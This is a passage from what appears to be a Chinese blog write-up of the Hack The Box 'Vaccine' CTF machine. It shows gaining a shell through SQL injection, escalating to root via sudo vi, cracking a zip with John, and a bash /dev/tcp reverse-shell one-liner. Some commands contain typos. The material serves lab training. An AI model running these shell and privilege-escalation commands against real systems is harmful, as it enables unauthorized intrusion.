-<h6 id="九、RootFlag"><a href="#九、RootFlag" class="headerlink" title="九、RootFlag"></a>九、RootFlag</h6><figure class="highlight shell"><table><tr><td class="code"><pre><span class="line"><span class="meta prompt_">#</span><span class="language-bash">从GitHub下载python脚本</span></span><br><span class="line">https://github.com/florianges/-HTB-Vaccine_sql_injection</span><br><span class="line"><span class="meta prompt_">#</span><span class="language-bash">复制nc.traditional文件到桌面，修改文件名为nc</span></span><br><span class="line">cp /bin/nc.traditional /home/Desktop/nc</span><br><span class="line"><span class="meta prompt_">#</span><span class="language-bash">开启python的web服务</span></span><br><span class="line">python3 -m http.server 80</span><br><span class="line"><span class="meta prompt_">#</span><span class="language-bash">修改sql_injection脚本，并开启nc监听</span></span><br><span class="line">nc -lvvp 4444</span><br><span class="line"><span class="meta prompt_">#</span><span class="language-bash">执行python脚本，获取shell（接收后不会弹出任何内容，直接执行命令即可）</span></span><br><span class="line"><span class="meta prompt_">#</span><span class="language-bash">使用如下命令提升为ttyshell</span></span><br><span class="line">SHELL=/bin/bash script -q /dev/null</span><br><span class="line">python3 -c &quot;import pty;pty.spawn(&#x27;/bin/bash&#x27;)&quot;</span><br><span class="line"><span class="meta prompt_">#</span><span class="language-bash">查看/var/www/html/dashboard.php文件，获取postgresql用户密码</span></span><br><span class="line">cat /var/www/html/dashboard.php</span><br><span class="line"><span class="meta prompt_">#</span><span class="language-bash">执行sudo -l，查看命令权限。输入刚才获取的密码</span></span><br><span class="line">sudo -l</span><br><span class="line"><span class="meta prompt_">#</span><span class="language-bash">编辑/pg_hba.conf文件</span></span><br><span class="line">sudo /bin/vi /etc/postgresql/11/main/pg_hba.conf</span><br><span class="line"><span class="meta prompt_">#</span><span class="language-bash">写入提权命令，回车</span></span><br><span class="line">:!/bin/bash</span><br><span class="line">whoami</span><br><span class="line"><span class="meta prompt_">#</span><span class="language-bash">find寻找root.txt文件</span></span><br><span class="line">find / type f -name root.txt 2&gt;dev/null</span><br><span class="line">cat /root/roo.txt</span><br></pre></td></tr></table></figure>
-
-<p><img src="https://s2.loli.net/2023/03/15/tdNITmk73lAF4Sj.png" alt="image-20230222172322409"></p>
-<p><img src="https://s2.loli.net/2023/03/15/Xg14BVmCLWuo5Hs.png" alt="image-20230222172338416"></p>
-<p><img src="https://s2.loli.net/2023/03/15/O3QyERKnWmSUJig.png" alt="image-20230222172522096"></p>
-<p><img src="https://s2.loli.net/2023/03/15/9lHpFg5xtrX2LUq.png" alt="image-20230222173052225"></p>
-<p><img src="https://s2.loli.net/2023/03/15/pHAPnOlmILU6QJE.png" alt="image-20230223111734986"></p>
-<p><img src="https://s2.loli.net/2023/03/15/degQvGHFfmPybzn.png" alt="image-20230223111812736"></p>
-<h5 id="总结"><a href="#总结" class="headerlink" title="总结"></a>总结</h5><ul>
-<li><p>John工具破解加密zip</p>
-<figure class="highlight shell"><table><tr><td class="code"><pre><span class="line"><span class="meta prompt_">#</span><span class="language-bash">生成<span class="built_in">hash</span>文件</span></span><br><span class="line">zip2john xxx.zip &gt;&gt; passwd.hash</span><br><span class="line"><span class="meta prompt_">#</span><span class="language-bash">破解<span class="built_in">hash</span></span></span><br><span class="line">jhon passwd.hash</span><br><span class="line"><span class="meta prompt_">#</span><span class="language-bash">显示密码</span></span><br><span class="line">jhon passwd.hash --show</span><br></pre></td></tr></table></figure>
-</li>
-<li><p>反弹shell</p>
-<figure class="highlight shell"><table><tr><td class="code"><pre><span class="line">bash -c &#x27;bash -i &gt;&amp; /dev/tcp/IP/PORT 0&gt;&amp;1&#x27;</span><br></pre></td></tr></table></figure></li>
-</ul>
-]]></content>
-      <categories>
-        <category>CTF</category>
-        <category>HTB</category>
-      </categories>
-      <tags>
-        <tag>HTB-Vaccine</tag>
       </tags>
   </entry>
 </search>
